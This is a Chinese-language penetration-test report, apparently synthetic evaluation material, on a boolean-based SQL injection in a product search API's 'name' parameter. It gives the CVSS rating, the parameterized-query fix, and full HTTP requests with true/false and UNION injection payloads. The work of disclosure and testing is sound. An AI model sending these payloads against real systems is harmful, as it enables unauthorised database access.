# 示例系统-商品搜索 name 参数 SQL 注入：真假条件改变查询结果

CVSS 4.0：CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N  评分 5.3（中危）

测试时间：2026年11月1日 10:00（北京时间）。

## 描述
普通用户搜索 `alpha` 得到一条测试商品。在同一参数后追加真假 SQL 条件，真条件仍返回一条，假条件返回零条；两种请求各重复一次，结果相同。UNION 请求返回 400，未取得其他数据。数据库版本、表结构和实际可读范围未验证。

### 定级依据

真假条件改变查询结果，支持 name 参数可影响 SQL 查询逻辑；其他数据读取或修改影响未验证。

## 修复
对 `name` 查询使用参数化语句，把输入作为普通值处理；排序字段等不能参数化的部分使用固定映射。修复后，SQL 片段不应改变查询逻辑。源码和数据库版本未核实，其他数据读取、写入及命令执行未验证。

## 测试过程

### 发现过程与攻击思路
从商品搜索请求的 `name` 参数开始排查。用 Burp Repeater 保持其他参数不变，依次发送正常搜索、真假条件请求，并重复真假条件请求；比较响应中的 `items` 和 `total`。UNION 请求返回 400。实际 Burp 复测未验证，当前结果来自离线合成报文。文末按用途列出全部请求和响应。

### 失败尝试与未验证项

UNION 请求返回 400。数据库版本、表结构和其他查询影响未测试。

## 攻击链路
```text
普通用户提交商品搜索关键词
└─ 在 name 参数追加真假 SQL 条件
   └─ GET /api/products
      └─ 真条件返回一条记录，假条件返回零条
```


## 证据说明

以下报文为离线合成材料，不对应真实服务。完整请求和响应按用途列在文末。

### Burp 复现

实际记录来自离线合成报文，Burp Repeater 复测未验证。复制文末正常查询请求到 Repeater，仅修改 name 参数，依次发送正常值、真假条件和重复请求，比较 items 与 total。

### 复测标准

修复后真假条件应与普通搜索词一样作为字面值处理，不能改变结果数量或查询逻辑。

### 完整请求与响应

#### 正常搜索

请求：

```http
GET /api/products?name=alpha HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 55

{"items":[{"id":"product-a","name":"alpha"}],"total":1}
```

#### 真条件搜索

请求：

```http
GET /api/products?name=alpha%27%20AND%201%3D1--%20 HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 55

{"items":[{"id":"product-a","name":"alpha"}],"total":1}
```

#### 假条件搜索

请求：

```http
GET /api/products?name=alpha%27%20AND%201%3D2--%20 HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 22

{"items":[],"total":0}
```

#### 再次发送真条件搜索

请求：

```http
GET /api/products?name=alpha%27%20AND%201%3D1--%20 HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 55

{"items":[{"id":"product-a","name":"alpha"}],"total":1}
```

#### 再次发送假条件搜索

请求：

```http
GET /api/products?name=alpha%27%20AND%201%3D2--%20 HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 22

{"items":[],"total":0}
```

#### UNION 方式搜索

请求：

```http
GET /api/products?name=alpha%27%20UNION%20SELECT%20NULL--%20 HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 400 Bad Request
Content-Type: application/json
Content-Length: 26

{"error":"query_rejected"}
```
